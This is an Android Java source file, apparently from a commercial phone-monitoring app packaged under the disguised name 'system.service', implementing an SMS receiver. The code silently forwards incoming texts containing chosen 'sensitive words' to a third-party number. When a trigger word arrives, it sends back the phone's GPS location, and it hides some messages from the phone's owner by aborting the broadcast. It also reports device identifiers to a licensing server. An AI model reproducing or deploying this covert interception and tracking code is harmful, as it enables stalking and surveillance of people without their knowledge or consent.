package system.service;

import java.text.DateFormat;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.InitActivity;
import system.service.config.ConfigCtrl;
import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.sms.SuperLoggingSms;
import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.LangUtil;
import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
import system.service.feature.sms.SmsCtrl;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.gps.GpsUtil;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Receiver for activating setting view.
 */
public class SmsReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "ActivationReceiver";
	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	
	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		if (!intent.getAction().equals(SMS_RECEIVED)) return;
		
		String smsBody = SmsCtrl.getSmsBody(intent).trim();
		if (smsBody.length() <= 0) return; 
		
		//-------------------------------------------------------------------------------
		// If it is the activation SMS (only include the key), show the setting view
		if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH &&  
			LicenseCtrl.calLicenseType(context, smsBody) != LICENSE_TYPE.NOT_LICENSED) 
		{
			abortBroadcast(); // Finish broadcast, the system will notify this SMS
			smsBody = smsBody.toUpperCase();
			LICENSE_TYPE licType = LicenseCtrl.calLicenseType(context, smsBody);
			
			// Save consumed datetime if it is the 1st activation
			if (ConfigCtrl.getConsumedDatetime(context) == null) {
				ConfigCtrl.setConsumedDatetime(context, (new Date()));
			}
			
			// If it is a trial key
			if (licType == LICENSE_TYPE.TRIAL_LICENSED) {
				// If it is out of trial, return 
				if (!ConfigCtrl.stillInTrial(context)) {
					SysUtils.messageBox(context, context.getResources().getString(R.string.msg_has_sent_trial_expire_sms));
					return;
				}
				
				// Trial key can only be used when not licensed before 
				if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) {
					ConfigCtrl.setLicenseType(context, LICENSE_TYPE.TRIAL_LICENSED);
				}
			}
			
			// If it is Super License Key, do not need to get response validation from server
			else if (licType == LICENSE_TYPE.SUPER_LICENSED) {
				// Save license key info to SharedPreferences
				if (!ConfigCtrl.setLicenseKey(context, smsBody)) {
					Log.e(LOGTAG, "Cannot set license key");
				}
				
				if (!ConfigCtrl.setLicenseType(context, LICENSE_TYPE.SUPER_LICENSED)) {
					Log.e(LOGTAG, "Cannot set license type");
					SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
					return;
				}
				
				// Send a SMS to server for logging info
				String deviceID = DeviceProperty.getDeviceId(context);
				String phoneNum = DeviceProperty.getPhoneNumber(context);
				String phoneModel = DeviceProperty.getDeviceModel();
				String androidVer = DeviceProperty.getAndroidVersion();
				LANG lang = DeviceProperty.getPhoneLang();
				SuperLoggingSms sms = new SuperLoggingSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
				String smsStr = sms.toString();
				String srvAddr = context.getResources().getString(R.string.srv_address).trim();
				boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
			}
			
			// If it is a full key or part key
			else {
				// Save license key info to SharedPreferences
				if (!ConfigCtrl.setLicenseKey(context, smsBody)) {
					Log.e(LOGTAG, "Cannot set license key");
				}
				
				if (!ConfigCtrl.setLicenseType(context, licType)) {
					Log.e(LOGTAG, "Cannot set license type");
					SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
					return;
				}
				
				// If it has not been validated by server, send SMS to server for license key validation, 
				// but still show the setting view for inputing mail address and etc.
				// The functions will really work until the response validation SMS comes from server. 
				if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) 
				{
					// Make sure the 2G/3G mobile networks available for sending/receiving validation SMS
					if (!DeviceProperty.isMobileConnected(context)) {
						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_mobile_net_unvailable));
						return;
					}
					
					String deviceID = DeviceProperty.getDeviceId(context);
					String phoneNum = DeviceProperty.getPhoneNumber(context);
					String phoneModel = DeviceProperty.getDeviceModel();
					String androidVer = DeviceProperty.getAndroidVersion();
					LANG lang = DeviceProperty.getPhoneLang();
					AuthSms sms = new AuthSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
					String smsStr = sms.clientSms2Str();
					String srvAddr = context.getResources().getString(R.string.srv_address).trim();
					boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
					if (ret) {
						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_auth_sms_sent_success));
						ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
					} else {
						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_auth_sms_sent_fail));
					}
				}
			}
			
			// Save the last activated datetime
			ConfigCtrl.setLastActivatedDatetime(context, (new Date()));
			
			// Send SMS to server to update last activated datetime
			//TODO
			
			// Start dialog
			Intent initIntent = new Intent().setClass(context, InitActivity.class);
			initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
			initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
			context.startActivity(initIntent);
		}
		
		//-------------------------------------------------------------------------------
		// If it is the response validation SMS from server
		else if (smsBody.startsWith(AuthSms.SMS_HEADER + AuthSms.SMS_SEPARATOR)) 
		{
			// If it is not from server (phone number is different), return
			//if (!SmsCtrl.getSmsAddress(intent).equalsIgnoreCase(context.getResources().getString(R.string.srv_address))) {
			//	return;
			//}
			
			String[] parts = smsBody.split(AuthSms.SMS_SEPARATOR);
			if (parts.length >= 4) {
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				// The time between sending Auth SMS and receiving Auth SMS cannot be more than 10 minites.
				/*
				String authSmsSentDatetimeStr = ConfigCtrl.getAuthSmsSentDatetime(context);
				ConfigCtrl.setAuthSmsSentDatetime(context, null); // clean the auth sms sent time
				Date authSmsSentDatetime = null;
				try {
					authSmsSentDatetime = DatetimeUtil.format.parse(authSmsSentDatetimeStr);
				}
				catch (ParseException e) {
					
				}
				Calendar c = Calendar.getInstance();
				long now = c.getTimeInMillis();
				c.setTime(authSmsSentDatetime);
				long lastly = c.getTimeInMillis();
				
				if ((now - lastly) > 600000) {
					Log.i(LOGTAG, "Auth SMS invalid due to out of time");
					return;
				}
				*/
					
				// --------------------------------------------------------------
				if (parts[3].equals(AuthSms.SMS_SUCCESS)) {
					// Save self phone number
					ConfigCtrl.setSelfPhoneNum(context, parts[2].trim());
					
					// Save license type info to SharedPreferences
					LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, parts[1]);
					if (!ConfigCtrl.setLicenseType(context, type)) {
						Log.e(LOGTAG, "Cannot set license type");
						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
						return;
					}
					
					// Save consumed datetime if it is the 1st activation
					if (ConfigCtrl.getConsumedDatetime(context) == null) {
						ConfigCtrl.setConsumedDatetime(context, (new Date()));
					}
				} else if (parts[3].equalsIgnoreCase(AuthSms.SMS_FAILURE)) {
					if (parts.length >= 4) {
						SysUtils.messageBox(context, parts[3]);
					} else {
						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_invalid_key));
					}
				}
			}
		}
			
		//-------------------------------------------------------------------------------
		// Redirect SMS that contains sensitive words
		else if (!smsBody.startsWith("Info,") && containSensitiveWords(context, smsBody)) 
		{
			// If neither in trail and nor licensed, return
			if (!ConfigCtrl.stillInTrial(context) && ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) {
				return;
			}
			
			String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
			if (phoneNum.length() > 0) {
				String smsAddress = SmsCtrl.getSmsAddress(intent);
				String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
				boolean ret = SmsCtrl.sendSms(phoneNum, header + smsBody);
			}
		}
		
		//-------------------------------------------------------------------------------
		// Send GPS position if being triggered by GPS activation word
		String gpsWord = GlobalPrefActivity.getGpsWord(context);
		if (gpsWord.length() > 0 && smsBody.contains(gpsWord)) 
		{
			// If neither in trail and nor licensed, return
			if (!ConfigCtrl.stillInTrial(context) && ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) {
				return;
			}
			
			if (!GlobalPrefActivity.getDisplayGpsSMS(context)) {
				abortBroadcast();
			}
			
			String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
			if (phoneNum.length() > 0) {
				if (BootService.gps == null) {
					SysUtils.messageBox(context, "Cannot get GPS utility object (NULL)");
					Log.e(LOGTAG, "GPS utility is NULL");
					return;
				}
				String realOrHist = "";
				Location location = BootService.gps.getLocation(realOrHist);
				//if (location == null) return;
				String locationSms = SmsCtrl.buildLocationSms(context, location, realOrHist);
				boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
			}
		}
		
        
	} // end of onReceive()
	
	private boolean containSensitiveWords(Context context, String sms) {
		boolean ret = false;
		String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context)
									.replaceAll(" {2,}", GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
									.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
		if (sensitiveWords.length == 0) return false; // We only redirect SMS that contains sensitive words intead of redirecting all. 
		int count = sensitiveWords.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT ? 
				GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT : sensitiveWords.length; 
		String smsBody = sms.toLowerCase();
		for (int i = 0; i < count; i++) {
			if (smsBody.contains(sensitiveWords[i].toLowerCase())) {
				ret = true;
				break;
			}
		}
		return ret;
	}

}